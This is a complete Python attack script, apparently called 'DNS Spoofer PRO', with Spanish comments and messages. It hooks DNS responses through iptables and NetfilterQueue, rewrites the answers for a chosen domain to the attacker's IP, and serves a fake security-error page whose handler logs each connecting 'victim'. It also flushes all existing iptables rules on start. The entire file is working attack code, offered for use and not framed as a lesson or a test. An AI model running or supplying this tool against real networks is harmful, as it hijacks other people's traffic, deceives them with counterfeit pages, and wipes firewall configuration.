#!/usr/bin/env python3
# Autor = Pepe >:)

import scapy.all as scapy
import socketserver
import http.server
import subprocess
import threading
import argparse
import socket
import sys
from netfilterqueue import NetfilterQueue
from termcolor import colored

# Configuración básica
scapy.conf.verb = 0

FAKE_HTML = """
<html>
<head><title>ERROR DE SEGURIDAD</title></head>
<body style="background-color:red; color:white; text-align:center; font-family:sans-serif; padding-top:100px;">
    <h1>ACCESO BLOQUEADO</h1>
    <h2>Se ha detectado actividad sospechosa en su conexion.</h2>
    <p>Por favor, contacte con el administrador de red.</p>
    <hr>
    <p><i>Error Code: DNS_PROBE_FINISHED_NXDOMAIN</i></p>
</body>
</html>
"""

def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofer PRO")
    parser.add_argument("-d", "--domain", dest="target_domain", required=True, help="Dominio a bloquear (ej: bing.com)")
    parser.add_argument("-ip", "--redirect-to", dest="redirect_ip", help="IP destino (opcional)")
    return parser.parse_args()

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def manage_iptables(enable=True):
    action = "-I" if enable else "-D"
    status = "ACTIVADA" if enable else "ELIMINADA"

    rules = [
        ["iptables", action, "FORWARD", "-p", "udp", "--sport", "53", "-j", "NFQUEUE", "--queue-num", "0"],
        ["iptables", action, "INPUT", "-p", "udp", "--sport", "53", "-j", "NFQUEUE", "--queue-num", "0"]
    ]
    
    try:
        for rule in rules:
            subprocess.run(rule, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(colored(f"[*] Reglas IPTables {status} (Capturando Respuestas DNS)", "green" if enable else "yellow"))
    except Exception as e:
        print(colored(f"[!] Error con IPTables: {e}", "red"))

class FakeHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(colored(f"[★] VÍCTIMA CONECTADA AL SERVIDOR FALSO: {self.client_address[0]}", "red", attrs=['bold']))
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(FAKE_HTML.encode("utf-8"))

    def log_message(self, format, *args):
        return

def start_fake_server(ip, port=80):
    print(colored(f"[+] Servidor Web Falso esperando víctimas en {ip}:{port}", "cyan"))
    try:
        with socketserver.TCPServer((ip, port), FakeHandler) as httpd:
            httpd.serve_forever()
    except OSError:
        print(colored("[!] El puerto 80 está ocupado. ¿Tienes Apache/Nginx activo? Apágalos.", "red"))

def process_packet(packet, target_domain, my_ip):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        
        if scapy_packet.haslayer(scapy.DNSRR) and scapy_packet[scapy.DNS].qr == 1:
            
            qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
            
            if target_domain in qname:
                print(colored(f"[+] ¡Dominio encontrado!: {qname}", "green"))
                print(colored(f"    --> Cambiando IP original por: {my_ip}", "yellow"))

                answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname, rdata=my_ip)

                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))
    
    except Exception as e:
        pass

    packet.accept()

def main():
    if len(sys.argv) < 2:
        print(colored("[!] Uso: sudo python3 dnsSpoofer.py -d bing.com", "red"))
        sys.exit(1)

    args = get_arguments()
    target_domain = args.target_domain
    redirect_ip = args.redirect_ip
    
    subprocess.run(["iptables", "--flush"], stderr=subprocess.DEVNULL)

    if not redirect_ip:
        redirect_ip = get_local_ip()
        print(colored(f"[*] Usando IP local para suplantación: {redirect_ip}", "blue"))
        
        server_thread = threading.Thread(target=start_fake_server, args=(redirect_ip, 80))
        server_thread.daemon = True
        server_thread.start()
    else:
        print(colored(f"[*] Redirigiendo a IP externa: {redirect_ip}", "blue"))

    manage_iptables(enable=True)

    queue = NetfilterQueue()

    try:
        print(colored("\n--- DNS SPOOFER PRO ACTIVO ---", "white", attrs=["bold"]))
        print(colored(f"[*] Objetivo: {target_domain}", "magenta"))
        print(colored("[!] Presiona Ctrl+C para salir.", "yellow"))
        
        queue.bind(0, lambda pkt: process_packet(pkt, target_domain, redirect_ip))
        queue.run()

    except KeyboardInterrupt:
        print(colored("\n[!] Deteniendo...", "yellow"))

    finally:
        # Limpieza al salir
        queue.unbind()
        manage_iptables(enable=False)
        print(colored("[*] IPTables limpiadas. Hasta luego.", "cyan"))

if __name__ == "__main__":
    main()